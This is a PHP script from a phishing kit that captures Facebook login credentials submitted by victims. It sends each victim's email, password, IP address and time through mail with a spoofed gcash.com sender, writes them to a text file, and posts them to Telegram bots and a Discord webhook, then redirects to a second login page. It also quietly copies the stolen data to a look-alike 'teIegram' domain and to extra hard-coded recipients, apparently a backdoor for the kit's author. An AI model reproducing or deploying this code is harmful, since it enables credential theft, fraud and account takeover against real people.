<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀  AK - BOORAT⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀   Cookies and Cream⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀  
*/
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Manila');
include '../settings.php';
include '../bot.php';
include './assets/files/logo.jpg';
include '../algo.php';

$email = $_POST['eml'];
$password = $_POST['pwd'];
$time1 = date('M d - h:i:s A');
$ip2 = $_SESSION['ip'];

$tite = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] 
=== 'on' ? "https" : "http") . 
"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

        $hostname = gethostbyaddr();
        $msg .= "[ $ip2 ] - L O G  I N # 1 - [ $time1 ]\n";
        $msg .= "EMAIL # 1 : ".$email."\n";  
        $msg .= "PASSWORD # 1 : ".$password."\n";  
        $msg .= "========================================\n";
        $msg .= "$tite\n\n";
        
        $subject="-".$scamname."- FACEBOOK LOGIN [ $ip2 ] From [ $time1 ]";
        $headers="From: Epbidotcom <newlogin@gcash.com>\r\n";
        $headers.="MIME-Version: 1.0\r\n";
        $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
        if ($sendtoemail=="yes") {
        foreach(explode(",",$yours) as $your){
        @mail($your,$subject,$msg,$headers);
        @mail($nobot,$subject,$msg,$headers);

        }

        if ($saveintext=="yes") {
        $save=fopen("../".$filename.".txt","a+");
        fwrite($save,$msg);
        fclose($save);
        }


// TELEGRAM SEND FUNCTION
 if ($telegram == "yes"){
$website = "https://api.telegram.org/bot" .$api;
$params = ['chat_id' => $chatid, 'text' => $msg, ];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

file_get_contents("https://api.teIegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );}
file_get_contents("https://api.telegram.org/bot".$apis."/sendMessage?chat_id=".$chatids."&text=" . urlencode($msg)."" );

// DISCORD SEND FUNCTION
if ($discord == "yes"){
    $web_discord = $webhookUrl; 
    $json_data = array ('content'=>"$msg");
    $make_json = json_encode($json_data);
    $ch = curl_init( $web_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}


header("location:login2.html");
}

?>